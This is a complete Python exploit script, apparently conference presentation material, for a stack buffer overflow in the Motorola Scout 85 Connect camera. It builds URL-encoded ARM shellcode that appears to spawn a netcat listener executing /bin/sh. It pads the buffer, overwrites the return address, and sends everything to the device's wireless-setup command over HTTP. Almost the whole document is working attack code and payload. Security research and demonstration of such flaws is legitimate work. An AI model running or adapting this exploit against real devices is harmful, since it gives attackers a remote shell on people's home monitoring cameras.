#!/usr/bin/python
# BSidesMCR Presentation Material
# Exploit for stack buffer overflow in Motorola Scout 85 Connect
# Dominic Chell <dominic [at] mdsec.co.uk>

import urllib, sys, socket
host = sys.argv[1]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,80)) 

shellcode=(

	# The overflow corrupts the stack pointer.
	# This needs to be fixed as we push the arguments for execve
	# to the stack, but as we're on the stack we can use $pc and
	# pivot to somewhere less important.

	"%0f%d0%a0%e1" # mov sp, pc
	"%2b%de%8d%e2" # add	sp, sp, #688

	# The shellcode needs a number of null bytes.
	# 0xff is left as a marker in the shellcode
	# The nops set a null in r1, write this to
	# the necessary locations in the shellcode.
    "%68%10%cf%e5" # strb r1, [pc, #104]
    "%66%10%cf%e5" # strb r1, [pc, #102]
    "%6b%10%cf%e5" # strb r1, [pc, #107]
    "%82%10%cf%e5" # strb r1, [pc, #130]
    
    # Jump in to thumb mode
    "%05%10%8f%e2" # add r1, pc #5
    "%11%ff%2f%e1" # bx r6
    "%01%10%8f%e2" # gets corrupted
    

	"%15%4f"
	"%80%b4"
	"%15%4f"
	"%80%b4"
	"%15%4f"
	"%80%b4"
	"%15%4f"
	"%80%b4"
	"%15%4f"
	"%80%b4"
	"%15%4f"
	"%80%b4"
	"%15%4f"
	"%80%b4"
	"%16%4f"
	"%80%b4"
	"%0e%4f"
	"%80%b4"
	"%15%4f"
	"%80%b4"
	"%b6%1b"
	"%40%b4"
	"%0f%21"
	"%69%44"
	"%0e%1c"
	"%40%b4"
	"%10%21"
	"%69%44"
	"%0e%1c"
	"%40%b4"
	"%0c%21"
	"%69%44"
	"%0e%1c"
	"%40%b4"
	"%69%46"
	"%92%1a"
	"%04%4f"
	"%80%b4"
	"%0b%4f"
	"%80%b4"
	"%68%46"
	"%0b%27"
	"%ff%df"
	"%ff%41"
	"%41%41%41%41"
	"%2f%73%68%ff"
	"%69%6e%2f%2f"
	"%65%20%2f%62"
	"%38%38%20%2d"
	"%70%20%38%38"
	"%63%20%2d%6c" # this gets overwritten by nulls
	"%63%20%2d%6c"
	"%2d%63%ff%6e"
	"%2f%62%69%6e"
)


shellcode_len = len(shellcode)/3
payloadsz = (172 - shellcode_len)/4
payloadsz+=1
payload = "%01%10%81%e1"*payloadsz # write nops of eor r1,r1


print "shellcode len = " + str(shellcode_len)

payload_len = len(payload)/3
payload_len += 4

print "payload len = " + str(payload_len)

eip = "%e0%cc%3f%ba" # Assumed static

wifi_pass = "A"

buffer = "GET /?action=command&command=setup_wireless_save&setup=100200"+ str(payload_len+shellcode_len) + "0100000000000"
buffer += payload + shellcode + eip + wifi_pass
buffer += " HTTP/1.0\r\nHost: 10.1.1.109\r\n\r\n"

print buffer

s.send(buffer) 
s.close() 

